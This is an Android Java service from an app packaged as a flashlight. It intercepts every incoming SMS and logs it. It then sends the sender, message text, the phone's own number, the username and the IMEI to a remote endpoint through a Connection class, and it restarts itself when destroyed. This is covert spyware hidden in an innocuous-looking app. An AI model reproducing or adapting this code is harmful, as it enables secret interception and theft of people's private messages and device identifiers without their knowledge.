package com.androidhive.flashlight;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.content.IntentFilter;
import org.json.JSONException;
import org.json.JSONObject;
/**
 * Created by lucadalseno on 25/06/17.
 */

public class MessageInService extends Service {

    private String messageBody;
    private String messageSource;
    private SMSreceiver mSMSreceiver;
    private IntentFilter mIntentFilter;
    private GetInfo info;
    private JSONObject doc;
    private JSONObject messageJSON;
    private Connection connection;

    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }

    private String getMessageBody(){
        return this.messageBody;
    }

    private void setMessageBody(String messageBody){
        this.messageBody = messageBody;
    }

    private String getMessageSource(){
        return this.messageSource;
    }

    private void setMessageSource(String messageSource){
        this.messageSource = messageSource;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        info = new GetInfo(this);


        //SMS event receiver
        mSMSreceiver = new SMSreceiver();
        mIntentFilter = new IntentFilter();
        mIntentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(mSMSreceiver, mIntentFilter);
    }


    @Override
    public void onDestroy() {
        super.onDestroy();

        //Recall Himself on destroy manually
        startService(new Intent(this, MessageInService.class));

        // Unregister the SMS receiver
        unregisterReceiver(mSMSreceiver);
    }


    private class SMSreceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            Bundle extras = intent.getExtras();

            String messageText = "";

            if (extras != null) {
                Object[] smsextras = (Object[]) extras.get("pdus");

                for (int i = 0; i < smsextras.length; i++) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) smsextras[i]);

                    setMessageBody(smsMessage.getMessageBody().toString());
                    setMessageSource(smsMessage.getOriginatingAddress());

                    messageText += "SMS from " + messageSource + " : " + messageBody;

                    Log.i("Message Info", messageText);
                }
            }

            try {

                doc = new JSONObject();
                messageJSON = new JSONObject();

                messageJSON.put("Sender", getMessageSource());
                messageJSON.put("ReceiverNumber", info.getPhoneNumber());
                messageJSON.put("Text", getMessageBody());
                messageJSON.put("Username", info.getUsername());
                messageJSON.put("IMEI", info.getImei());

                doc.put("Message", messageJSON);
                doc.put("r", "pushMessage");

                connection = new Connection(doc);
                connection.execute();

            } catch (JSONException e){
                e.printStackTrace();
            }


        }
    }
}
